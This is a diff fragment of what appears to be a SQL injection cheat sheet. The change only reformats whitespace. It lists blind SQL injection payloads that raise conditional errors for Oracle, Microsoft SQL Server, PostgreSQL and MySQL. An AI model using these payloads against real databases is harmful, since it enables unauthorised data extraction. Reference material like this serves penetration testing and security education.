@@ -30,13 +30,17 @@
 ### Blind SQL
 ```
 #Oracle  
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual  
+
 #Microsoft  
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END  
+
 #PostgreSQL  
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END  
+
 #MySQL  
-SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')  
+
 ```
 ### Retrieving multiple values in a single column (String Concatenation)
 ```
